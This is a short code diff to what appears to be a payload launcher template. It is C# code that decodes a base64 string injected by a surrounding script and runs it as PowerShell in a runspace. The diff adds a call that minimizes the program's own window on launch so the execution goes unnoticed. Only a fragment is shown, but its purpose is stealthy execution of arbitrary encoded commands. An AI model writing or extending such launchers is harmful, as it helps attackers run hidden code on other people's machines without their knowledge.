@@ -261,6 +261,9 @@ using System.Management.Automation.Runspaces;
 
 public class Program
 	{
+        [DllImport( "user32.dll" )]
+        public static extern bool ShowWindow( IntPtr hWnd, int nCmdShow );
+        public const int SW_SHOWMINIMIZED = 2;
 		public static string InvokeAutomation(string cmd)
 		{
 		    Runspace newrunspace = RunspaceFactory.CreateRunspace();
@@ -281,6 +284,8 @@ public class Program
 		}
 		public static void Main()
 		{
+            IntPtr winHandle = System.Diagnostics.Process.GetCurrentProcess().MainWindowHandle;
+            ShowWindow( winHandle, SW_SHOWMINIMIZED );
 	        try
 	        {
 	            string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
